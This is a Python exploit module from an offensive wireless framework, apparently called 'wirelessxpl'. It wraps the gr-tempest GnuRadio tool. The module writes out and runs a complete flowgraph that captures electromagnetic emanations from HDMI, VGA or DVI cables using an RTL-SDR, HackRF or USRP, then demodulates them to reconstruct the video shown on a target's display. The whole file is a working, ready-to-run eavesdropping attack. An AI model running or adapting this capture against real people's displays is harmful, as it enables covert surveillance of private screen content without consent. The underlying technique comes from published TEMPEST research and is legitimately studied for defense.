# Author: André Henrique (LinkedIn/X: @mrhenrike)
import os
import shutil
import struct
import subprocess
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """gr-tempest: GnuRadio Module for Video EM Emanation Capture.

    Uses the gr-tempest GnuRadio out-of-tree module to capture and
    demodulate electromagnetic emanations from video display cables.
    The GnuRadio flowgraph handles SDR front-end control, frequency
    tuning, signal conditioning, and real-time video reconstruction.

    This module generates and executes a GnuRadio flowgraph tailored
    to the target display parameters (resolution, refresh rate) and
    the available SDR hardware.

    Hardware necessario:
      - RTL-SDR V3, HackRF One, ou USRP (B200/B210) como receptor SDR
      - GnuRadio 3.10+ instalado com gr-tempest OOT module
      - Antena direcional (Yagi UHF ou log-periodic)
      - (Opcional) LNA externo para maior sensibilidade

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "gr-tempest GnuRadio Video EM Emanation Capture",
        "description": (
            "Uses the gr-tempest GnuRadio OOT module to capture and "
            "reconstruct video from EM emanations of display cables.  "
            "Real-time flowgraph for SDR capture, demodulation, and "
            "video reconstruction.  Hardware: RTL-SDR V3 / HackRF / "
            "USRP + antena direcional + GnuRadio 3.10+ com gr-tempest."
        ),
        "authors": (
            "gr-tempest contributors",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://github.com/git-artes/gr-tempest",
            "https://iie.fing.edu.uy/investigacion/grupos/artes/",
        ),
        "disclosure_date": "2020-01-01",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "HDMI displays (unshielded or weakly shielded cables)",
            "VGA displays (strong emanations)",
            "DVI-D displays",
        ),
    }

    target = OptIP("", "Not used (passive EM capture)")
    port = OptPort(1, "Not used (passive EM capture)")
    timeout = OptFloat(60.0, "Flowgraph run duration in seconds")
    center_freq = OptFloat(350e6, "Center frequency in Hz")
    sample_rate = OptFloat(2.4e6, "SDR sample rate in sps")
    gain = OptFloat(40.0, "SDR gain in dB")
    sdr_source = OptString("rtlsdr", "GnuRadio SDR source: rtlsdr, hackrf, uhd")
    output_dir = OptString("/tmp/gr_tempest", "Output directory for captures")
    width = OptInteger(1920, "Target horizontal resolution")
    height = OptInteger(1080, "Target vertical resolution")
    refresh_rate = OptFloat(60.0, "Target refresh rate in Hz")
    blanking_h = OptFloat(0.25, "Horizontal blanking ratio (typically 0.20-0.30)")
    blanking_v = OptFloat(0.05, "Vertical blanking ratio (typically 0.03-0.06)")

    def _gnuradio_available(self) -> bool:
        return shutil.which("gnuradio-companion") is not None or shutil.which("grcc") is not None

    def _gr_tempest_installed(self) -> bool:
        try:
            result = subprocess.run(
                ["python3", "-c", "import tempest"],
                capture_output=True,
                timeout=5,
            )
            return result.returncode == 0
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return False

    def _pixel_clock_hz(self) -> float:
        h_total = self.width * (1 + self.blanking_h)
        v_total = self.height * (1 + self.blanking_v)
        return h_total * v_total * self.refresh_rate

    def _generate_flowgraph(self, output_file: str) -> str:
        """Generate a Python GnuRadio flowgraph script for TEMPEST capture."""
        src = str(self.sdr_source)
        if src == "rtlsdr":
            source_block = (
                f"osmosdr.source(args='rtl=0')\n"
                f"        src.set_sample_rate({self.sample_rate})\n"
                f"        src.set_center_freq({self.center_freq})\n"
                f"        src.set_gain({self.gain})\n"
            )
        elif src == "hackrf":
            source_block = (
                f"osmosdr.source(args='hackrf=0')\n"
                f"        src.set_sample_rate({self.sample_rate})\n"
                f"        src.set_center_freq({self.center_freq})\n"
                f"        src.set_gain({self.gain})\n"
            )
        else:
            source_block = (
                f"uhd.usrp_source(','.join(('', '')), uhd.stream_args('fc32'))\n"
                f"        src.set_samp_rate({self.sample_rate})\n"
                f"        src.set_center_freq({self.center_freq})\n"
                f"        src.set_gain({self.gain})\n"
            )

        pixel_clk = self._pixel_clock_hz()
        h_total = int(self.width * (1 + self.blanking_h))
        v_total = int(self.height * (1 + self.blanking_v))

        script = f"""#!/usr/bin/env python3
# Auto-generated gr-tempest flowgraph
import time
try:
    from gnuradio import gr, blocks, analog, filter as gr_filter
    import osmosdr
except ImportError:
    print("GnuRadio or osmosdr not available")
    raise SystemExit(1)

class TempestCapture(gr.top_block):
    def __init__(self):
        gr.top_block.__init__(self)
        src = {source_block}
        # AM demodulation: complex to mag
        c2m = blocks.complex_to_mag(1)
        # Low-pass filter for video bandwidth
        lpf = gr_filter.fir_filter_fff(
            1, gr_filter.firdes.low_pass(1, {self.sample_rate}, {pixel_clk / 2}, {pixel_clk / 10})
        )
        # File sink for raw video
        sink = blocks.file_sink(gr.sizeof_float, "{output_file}")
        self.connect(src, c2m, lpf, sink)

if __name__ == "__main__":
    tb = TempestCapture()
    tb.start()
    time.sleep({self.timeout})
    tb.stop()
    tb.wait()
    print("Capture complete: {output_file}")
"""
        return script

    @mute
    def check(self) -> bool:
        return self._gnuradio_available()

    def run(self) -> None:
        if not self._gnuradio_available():
            print_error(
                "GnuRadio not found.  Install gnuradio and gr-tempest OOT module."
            )
            return

        pixel_clk = self._pixel_clock_hz()
        print_success(
            f"GnuRadio available.  Pixel clock: {pixel_clk / 1e6:.2f} MHz"
        )
        self._exploit()

    def _exploit(self) -> None:
        os.makedirs(str(self.output_dir), exist_ok=True)
        raw_file = os.path.join(str(self.output_dir), "video_raw.f32")
        script_path = os.path.join(str(self.output_dir), "tempest_capture.py")

        script = self._generate_flowgraph(raw_file)
        with open(script_path, "w") as f:
            f.write(script)
        os.chmod(script_path, 0o755)

        print_status(f"Flowgraph script written to {script_path}")
        print_status(f"Running GnuRadio capture for {self.timeout}s ...")

        try:
            result = subprocess.run(
                ["python3", script_path],
                capture_output=True,
                timeout=self.timeout + 15,
            )
            if result.returncode == 0:
                if os.path.exists(raw_file):
                    size = os.path.getsize(raw_file)
                    print_success(f"Capture complete: {raw_file} ({size} bytes)")
                    print_info(
                        "Use gr-tempest viewer or convert to PGM for analysis.  "
                        "Adjust center_freq to a pixel clock harmonic for best results."
                    )
                else:
                    print_error("Capture file not created")
            else:
                stderr = result.stderr.decode(errors="replace")[:500]
                print_error(f"GnuRadio flowgraph failed: {stderr}")
        except subprocess.TimeoutExpired:
            print_error("Flowgraph execution timed out")
        except FileNotFoundError:
            print_error("python3 not found")
